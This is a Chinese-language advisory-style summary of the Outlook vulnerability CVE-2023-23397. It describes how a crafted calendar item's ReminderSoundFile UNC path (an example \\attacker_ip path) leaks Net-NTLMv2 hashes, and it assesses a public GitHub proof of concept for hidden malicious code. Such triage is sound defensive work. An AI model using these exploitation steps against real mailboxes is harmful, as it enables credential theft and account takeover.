## CVE-2023-23397 Microsoft Outlook 权限提升漏洞

**漏洞编号:** CVE-2023-23397

**漏洞类型:** 权限提升

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致NTLM Relay攻击，控制受害者账户

**影响版本:** 受影响版本：Microsoft Outlook 2013 SP1, Outlook 2016, Outlook 2019, Office LTSC 2021, Microsoft 365 Apps for Enterprise (查看漏洞库信息中的详细版本范围)

**利用条件:** 攻击者需要知道目标用户的邮件地址，并能够发送邮件到目标用户的Outlook邮箱。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-23397 是一个 Microsoft Outlook 中的权限提升漏洞。攻击者可以通过发送特制的电子邮件，在无需用户交互的情况下，强制 Outlook 客户端连接到攻击者控制的 SMB 服务器，从而窃取 Net-NTLMv2 哈希。利用方式如下：

1.  **漏洞原理：** Outlook 在处理邮件时，如果邮件中包含 `ReminderSoundFile` 属性指向 UNC 路径（例如 `\\attacker_ip\share\sound.wav`），Outlook 会尝试连接到该路径。该连接使用用户的 Windows 凭据进行身份验证，因此攻击者可以捕获 Net-NTLMv2 哈希。

2.  **PoC 代码分析：**  提供的 PoC 代码 `Exploit.py`  利用 `win32com.client` 库来创建包含恶意 `ReminderSoundFile` 属性的 Outlook 日程安排。脚本会要求攻击者输入目标电子邮件地址和攻击者的 IP 地址（c2，也就是接收哈希的服务器）。然后，它将 UNC 路径设置为 `\\attacker_ip`，并将其设置为 `ReminderSoundFile` 属性。该脚本可以选择将恶意邮件保存为 `.msg` 文件或直接发送。

3.  **有效性评估：** 结合漏洞库信息、搜索引擎结果和 PoC 代码，可以确定该 PoC 代码是有效的。该漏洞已经被广泛研究和利用，并且CISA的已知被利用漏洞目录中也包含了该漏洞。

4.  **投毒风险评估：**  
    *   PoC 代码的主要功能是生成利用 CVE-2023-23397 漏洞的恶意邮件。代码本身看起来比较直接，没有明显的恶意行为，例如安装后门或执行其他未声明的操作。
    *   风险点可能存在于攻击者提供的 `attacker_ip` 参数。如果攻击者控制了该 IP 地址，他们可以捕获 NTLM 哈希。但是，这属于漏洞本身的利用方式，而不是 PoC 代码的投毒行为。
    *   文件LICENSE和README.md没有发现异常
    综合考虑，PoC 代码本身存在作者隐藏的恶意代码的风险较低。但始终需要保持警惕，在运行 PoC 代码之前，应仔细检查代码，并在隔离环境中运行。

5.  **利用方式总结：**
    1.  攻击者构造包含恶意 `ReminderSoundFile` 属性的 Outlook 日程安排。
    2.  将该日程安排以邮件的形式发送给目标用户。
    3.  当目标用户在 Outlook 中打开该邮件时，Outlook 客户端会尝试连接到 `ReminderSoundFile` 属性指定的 UNC 路径。
    4.  攻击者监听 SMB 流量，捕获 Net-NTLMv2 哈希。
    5.  攻击者可以使用捕获的哈希进行 NTLM Relay 攻击或尝试破解哈希以获得用户密码。

**项目地址:** [Pushkarup/CVE-2023-23397](https://github.com/Pushkarup/CVE-2023-23397)

**漏洞详情:** [CVE-2023-23397](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)